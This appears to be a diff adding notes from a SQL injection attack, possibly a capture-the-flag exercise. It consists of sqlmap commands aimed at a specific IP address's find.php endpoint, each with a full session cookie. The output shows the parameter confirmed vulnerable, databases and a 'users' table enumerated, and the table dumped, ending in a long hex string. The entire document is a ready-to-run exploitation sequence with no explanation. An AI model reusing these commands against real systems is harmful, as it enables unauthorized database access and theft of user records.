@@ -1,0 +1,28 @@
+sqlmap -u 'http://162.243.171.85:80/find.php' --data='username=admin' --cookie='PHPSESSID=e6f1641f4aeb281f0cf7287dc4c9e6be6aee4c0901514340b51f76d406b5a7228adb4187843f80fc378434c575dd47794f4d25c7bca81659670d48533dde583f' -p "username"
+
+Is vulnerable
+
+sqlmap -u 'http://162.243.171.85:80/find.php' --data='username=admin' --cookie='PHPSESSID=e6f1641f4aeb281f0cf7287dc4c9e6be6aee4c0901514340b51f76d406b5a7228adb4187843f80fc378434c575dd47794f4d25c7bca81659670d48533dde583f' -p "username" --dbs
+
+[12:19:17] [INFO] fetching database names
+available databases [2]:
+[*] information_schema
+[*] TopSecret
+
+
+
+sqlmap -u 'http://162.243.171.85:80/find.php' --data='username=admin' --cookie='PHPSESSID=e6f1641f4aeb281f0cf7287dc4c9e6be6aee4c0901514340b51f76d406b5a7228adb4187843f80fc378434c575dd47794f4d25c7bca81659670d48533dde583f' -p "username" -D TopSecret --table
+
+[12:21:02] [INFO] fetching tables for database: 'TopSecret'
+Database: TopSecret
+[1 table]
++-------+
+| users |
++-------+
+
+sqlmap -u 'http://162.243.171.85:80/find.php' --data='username=admin' --cookie='PHPSESSID=e6f1641f4aeb281f0cf7287dc4c9e6be6aee4c0901514340b51f76d406b5a7228adb4187843f80fc378434c575dd47794f4d25c7bca81659670d48533dde583f' -p "username" -D TopSecret -T users --dump
+
+
+
+
+3f44e5dedf6b06b5da8c6e5ec7c0f4304f334a2ff2b1da3654942bab969e89765dae32faeabefdc0cf15d506c5146d96289dfa9929af7f60d65055d978e406ec
